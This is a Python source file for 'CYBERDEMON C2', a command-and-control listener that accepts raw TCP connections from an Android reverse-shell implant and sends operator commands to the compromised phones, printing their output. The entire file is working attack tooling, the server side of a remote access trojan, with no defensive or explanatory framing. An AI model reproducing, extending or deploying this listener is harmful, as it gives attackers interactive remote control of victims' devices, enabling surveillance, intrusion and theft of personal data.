#!/usr/bin/env python3
"""
CYBERDEMON C2 — Android Reverse Shell Listener
Raw TCP listener for ReverseShell.java implant.
"""

import socket
import threading
import select
import sys
import os

C = '\033[36m'
G = '\033[92m'
R = '\033[91m'
D = '\033[90m'
B = '\033[1m'
N = '\033[0m'

BANNER = f'''
{B}{C}  CYBERDEMON C2 — ANDROID REVERSE SHELL{N}
'''


def recv_line(conn, timeout=5.0):
    buf = b""
    try:
        start = __import__('time').time()
        while __import__('time').time() - start < timeout:
            r, _, _ = select.select([conn], [], [], 0.5)
            if r:
                chunk = conn.recv(65536)
                if not chunk:
                    break
                buf += chunk
                if b"\n" in buf:
                    break
    except Exception:
        pass
    return buf.decode(errors='replace').strip()


def handle_client(conn, addr):
    print(f"\n{G}[+] Connection from {addr[0]}:{addr[1]}{N}")
    try:
        while True:
            try:
                cmd = input(f"{C}shell{N}> ")
            except (EOFError, KeyboardInterrupt):
                break

            if not cmd.strip():
                continue
            if cmd.strip().lower() == "exit":
                break

            conn.sendall((cmd.strip() + "\n").encode())

            raw = recv_line(conn, timeout=10.0)
            if not raw:
                print(f"{R}[-] No response{N}")
                continue

            # Strip CMD: prefix if present
            if ":" in raw:
                idx = raw.index(":")
                prefix = raw[:idx]
                if prefix.isupper():
                    data = raw[idx + 1:]
                else:
                    data = raw
            else:
                data = raw

            print(data.replace("\\n", "\n"))
    except (ConnectionResetError, BrokenPipeError):
        print(f"{R}[-] Connection lost{N}")
    except Exception as e:
        print(f"{R}[-] Error: {e}{N}")
    finally:
        conn.close()
        print(f"{D}[*] Disconnected{N}")


def main():
    port = int(sys.argv[1]) if len(sys.argv) > 1 else 8080
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(('0.0.0.0', port))
    server.listen(5)

    os.system('clear')
    print(BANNER)
    print(f"{G}[+] Listening on 0.0.0.0:{port}{N}\n")

    try:
        while True:
            conn, addr = server.accept()
            threading.Thread(target=handle_client, args=(conn, addr), daemon=True).start()
    except KeyboardInterrupt:
        print(f"\n{R}[-] Shutting down{N}")
    finally:
        server.close()


if __name__ == "__main__":
    main()
